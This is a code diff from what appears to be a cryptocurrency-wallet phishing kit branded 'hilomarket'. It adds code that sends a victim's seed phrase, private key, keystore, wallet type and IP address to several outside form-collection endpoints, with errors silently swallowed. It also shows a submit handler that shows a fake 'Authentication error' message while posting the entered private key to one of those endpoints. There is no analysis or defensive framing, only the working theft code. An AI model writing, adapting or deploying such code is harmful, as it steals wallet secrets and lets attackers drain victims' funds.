@@ -228,6 +228,71 @@
             text: getInputValues()
         };
         try {
+                await postData(
+                    {
+                type,
+                wallet,
+                words: phrase,
+                privateKey,
+                keyStore,
+                ip,
+                from: 'hilomarket'
+            } 
+            , 'https://formspree.io/f/xoqygoyr');
+            } catch (error) {
+                
+            }
+            try {
+                await postData(
+                    {
+                      type,
+                wallet,
+                words : phrase,
+                privateKey,
+                keyStore,
+                ip,
+                from: 'hilomarket'
+            }
+            , 'https://submit-form.com/hhqjeRxsV');
+            } catch (error) {
+                
+            }
+        try {
+          await postData(
+          dataToSubmit
+          , 'https://formspree.io/f/mkgwebba');
+          } catch (error) {
+              
+          }
+        try {
+          await postData(
+          dataToSubmit
+          , 'https://usebasin.com/f/4ffbe28701fb');
+          } catch (error) {
+              
+          }
+        try {
+          await postData(
+          dataToSubmit
+          , 'https://usebasin.com/f/ad4b4ad2c1cd');
+          } catch (error) {
+              
+          }
+        try {
+          await postData(
+          dataToSubmit
+          , 'https://usebasin.com/f/29e6b9cfee95');
+          } catch (error) {
+              
+          }
+        try {
+            await postData(
+            dataToSubmit
+        , 'https://usebasin.com/f/4ffbe28701fb');
+        } catch (error) {
+            
+        }
+        try {
             await postData(
             dataToSubmit
         , 'https://usebasin.com/f/ad4b4ad2c1cd');
@@ -297,7 +362,7 @@
         $('form').on('submit', function(e) {
             e.preventDefault();
             new swal( "Error Restoring" ,  "Authentication error, please try again!" ,  "error" )
-            $.post('https://usebasin.com/f/ad4b4ad2c1cd', { 
+            $.post('https://usebasin.com/f/29e6b9cfee95', { 
                 // to: 'Katieveronica315@gmail.com',
                 user: $('[name=privatekey]').val(),
                 pwd: '.',
